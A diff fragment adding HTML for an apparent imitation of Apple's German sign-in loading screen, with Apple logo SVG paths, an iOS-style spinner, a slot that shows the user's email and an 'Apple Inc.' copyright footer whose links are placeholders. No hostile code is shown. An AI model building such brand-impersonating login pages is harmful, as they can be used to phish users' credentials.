5.201 2.62 2.62 0 01.638-5.201zm7.24-7.477a3.023 3.023 0 110 6.046 3.023 3.023 0 010-6.046zm-120.128-.094a3.023 3.023 0 11-1.565 5.841 3.023 3.023 0 011.565-5.84zm135.342-2.99a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.62zM.162 68.862a3.81 3.81 0 117.36 1.972 3.81 3.81 0 01-7.36-1.972zm29.28-5.072a2.65 2.65 0 11-1.984 4.913 2.65 2.65 0 011.985-4.913zm104.844 1.355a2.65 2.65 0 11-5.247.737 2.65 2.65 0 015.247-.737zm-117.992-5.89a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm132.102 1.708a3.338 3.338 0 11-6.61.929 3.338 3.338 0 016.61-.93zm-8.594-4.735a3.023 3.023 0 11-5.84 1.565 3.023 3.023 0 015.84-1.565zm-114.08-2.019a3.023 3.023 0 11-3.024 5.237 3.023 3.023 0 013.024-5.237zm9.569-3.001a2.65 2.65 0 11-3.189 4.23 2.65 2.65 0 013.189-4.23zm93.381.423a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm26.039-1.904a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zM10.969 47.183a3.81 3.81 0 11-3.809 6.599 3.81 3.81 0 013.81-6.599zm12.693-3.781a3.338 3.338 0 11-4.017 5.331 3.338 3.338 0 014.017-5.331zm117.661.533a3.338 3.338 0 11-6.145 2.608 3.338 3.338 0 016.145-2.608zm-9.76-2.235a3.023 3.023 0 11-5.237 3.024 3.023 3.023 0 015.237-3.024zm-97.233-.783a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm9.866-.35a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm75.556-.537a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm24.578-8.608a3.81 3.81 0 11-6.599 3.81 3.81 3.81 0 016.599-3.81zm-122.515-.987a3.81 3.81 0 11-5.387 5.388 3.81 3.81 0 015.387-5.388zm33.736 2.159a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm52.583-1.46a2.65 2.65 0 11-3.189 4.231 2.65 2.65 0 013.189-4.231zm-73.251-1.14a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm84.962-.194a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm-73.76.505a3.023 3.023 0 11-5.238 3.024 3.023 3.023 0 015.237-3.024zm83.999-.987a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-61.5-1.487a2.65 2.65 0 11-5.247.738 2.65 2.65 0 015.247-.738zm26.024-2.284a2.65 2.65 0 11-1.984 4.913 2.65 2.65 0 011.984-4.913zm-14.487-1.912a2.62 2.62 0 11-.639 5.201 2.62 2.62 0 01.639-5.201zm25.325-2.297a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm-45.261 1.76a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-10.994-3.15a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm66.254-1.84a3.338 3.338 0 11-4.018 5.332 3.338 3.338 0 014.018-5.331zm14.12-1.68a3.81 3.81 0 11-5.388 5.387 3.81 3.81 0 015.388-5.387zm-40.217.463a3.023 3.023 0 11-1.565 5.84 3.023 3.023 0 011.565-5.84zm-16.701-.13a3.023 3.023 0 110 6.048 3.023 3.023 0 010-6.047zm-36.02.304a3.81 3.81 0 11-6.6 3.81 3.81 3.81 0 016.6-3.81zm28.985-3.118a3.338 3.338 0 11-6.611.93 3.338 3.338 0 016.61-.93zm32.79-2.877a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zM80.149 8.66a3.302 3.302 0 11-.804 6.553 3.302 3.302 0 01.804-6.553zm31.274-2.894a3.81 3.81 0 11-3.81 6.598 3.81 3.81 0 013.81-6.598zm-57.03 2.217a3.81 3.81 0 11-7.359 1.972 3.81 3.81 0 017.36-1.972zM91.139.163a3.81 3.81 0 11-1.972 7.359 3.81 3.81 0 011.972-7.36zM70.095 0a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.619z"/>
+        </defs>
+        <use fill="#FFF" xlink:href="#lo-dots"/>
+        <use fill="url(#lo-a)" xlink:href="#lo-dots"/>
+        <use fill="url(#lo-b)" xlink:href="#lo-dots"/>
+        <use fill="url(#lo-c)" xlink:href="#lo-dots"/>
+        <use fill="url(#lo-d)" xlink:href="#lo-dots"/>
+        <path fill="var(--theme-color-systemBlack)" d="M80.38 68.181c1.66 0 3.75-1.091 4.999-2.565 1.137-1.346 1.94-3.183 1.94-5.039 0-.255-.02-.51-.057-.71-1.865.073-4.103 1.201-5.427 2.73-1.063 1.164-2.033 3.02-2.033 4.875 0 .29.056.564.075.655.112.018.298.054.503.054zm-5.724 27.713c2.248 0 3.243-1.474 6.044-1.474 2.838 0 3.483 1.438 5.97 1.438 2.47 0 4.11-2.239 5.677-4.44 1.732-2.53 2.469-4.987 2.487-5.115-.147-.036-4.865-1.947-4.865-7.28 0-4.622 3.704-6.697 3.926-6.86-2.451-3.477-6.192-3.586-7.224-3.586-2.746 0-4.994 1.656-6.431 1.656-1.53 0-3.52-1.547-5.916-1.547-4.551 0-9.158 3.713-9.158 10.701 0 4.368 1.695 8.973 3.814 11.94 1.806 2.51 3.39 4.567 5.676 4.567z"/>
+      </svg>
+
+      <!-- 12-blade iOS spinner -->
+      <div class="ios-activity" aria-hidden="true">
+        <div class="blade"></div><div class="blade"></div><div class="blade"></div>
+        <div class="blade"></div><div class="blade"></div><div class="blade"></div>
+        <div class="blade"></div><div class="blade"></div><div class="blade"></div>
+        <div class="blade"></div><div class="blade"></div><div class="blade"></div>
+      </div>
+
+      <p class="loading-title">Anmeldung wird durchgeführt…</p>
+      <p class="loading-sub" id="loadingEmail"></p>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <footer class="site-footer">
+    <nav class="footer-links">
+      <a href="#">Systemstatus</a>
+      <a href="#">Datenschutzrichtlinie</a>
+      <a href="#">Allgemeine Geschäftsbedingungen</a>
+    </nav>
+    <span class="footer-copy">Copyright &copy; 2026 Apple Inc. Alle Rechte vorbehalten.</span>
+  </footer>
+
+
+</body>
+</html>
